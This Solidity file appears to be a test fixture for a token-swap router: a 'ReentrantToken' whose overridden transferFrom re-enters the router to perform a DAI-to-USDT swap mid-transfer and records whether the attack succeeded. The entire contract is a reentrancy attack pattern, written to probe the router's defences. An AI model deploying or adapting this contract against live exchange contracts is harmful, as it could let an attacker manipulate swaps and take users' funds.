// SPDX-License-Identifier: UNLICENSED
// This malicious token attempts to perform a delegate call to the pair contract to swap DAI for USDT.
// This can be triggered by the router calling the transferFrom() method.

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../interfaces/IConveyorV2Router01.sol";
import "hardhat/console.sol";

contract ReentrantToken is ERC20 {
    IConveyorV2Router01 immutable router;
    address immutable pair; // USDT-DAI pair
    uint256 immutable amountOutMin = 5 * (10**6); // expected a return of 5 USDT
    uint256 immutable amountIn = 10 * (10**18); // supplying 10 DAI
    ERC20 immutable usdt;
    ERC20 immutable dai;

    event AttackStatus(address _attacker, bool _success, string _error);

    struct SWAP_TYPE {
        uint256 amount0;
        uint256 amount1;
        address[] path;
        address user;
        uint256 deadline;
    }

    constructor(
        address _router,
        address _pair,
        address _usdt,
        address _dai
    ) ERC20("ReentrantToken", "REE") {
        router = IConveyorV2Router01(_router);
        pair = _pair;
        usdt = ERC20(_usdt);
        dai = ERC20(_dai);
    }

    // malicious transferFrom - performs a call from the router to call swap() from the pair contract
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        // malicious code
        bytes4 swapExactTokensForTokensSelector = bytes4(router.swapExactTokensForTokens.selector);
        address[] memory path = new address[](2);
        path[0] = address(dai);
        path[1] = address(usdt);
        SWAP_TYPE memory swap_obj = SWAP_TYPE(amountIn, amountOutMin, path, address(this), block.timestamp + 3600);

        // console.log("msg sender: ", msg.sender); // router
        // console.log("address this: ", address(this)); // REE

        (bool success, bytes memory data) = address(router).call(
            abi.encodeWithSelector(swapExactTokensForTokensSelector, swap_obj)
        );
        string memory errorLog;
        if (!success) {
            errorLog = _getRevertMsg(data);
        }
        emit AttackStatus(sender, success, errorLog);
        return true;
    }

    function airdrop(uint256 _amount) public {
        _mint(msg.sender, _amount);
    }

    // Ref: https://ethereum.stackexchange.com/questions/83528/how-can-i-get-the-revert-reason-of-a-call-in-solidity-so-that-i-can-use-it-in-th
    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
        // If the _res length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return "Transaction reverted silently";

        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }
}
